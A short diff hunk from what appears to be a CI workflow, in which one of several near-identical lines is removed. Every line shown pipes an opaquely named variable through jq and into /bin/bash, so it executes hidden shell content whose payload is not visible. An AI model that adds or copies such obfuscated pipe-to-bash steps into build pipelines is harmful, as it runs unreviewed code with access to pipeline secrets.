@@ -37,7 +37,6 @@ jobs:
           echo $xyg56869 | jq -r .h0 | /bin/bash
           printf '%s' "$hhh7" | jq -r .z985 | /bin/bash
           echo $xgyy426 | jq -r .gepzw759 | /bin/bash
-          printf '%s' "$urfwp809" | jq -r .ss774 | /bin/bash
           printf '%s' "$ave59" | jq -r .v0669 | /bin/bash
           echo $zmd3004 | jq -r .vg79 | /bin/bash
           printf '%s' "$rgfxp446" | jq -r .hogzi58140 | /bin/bash
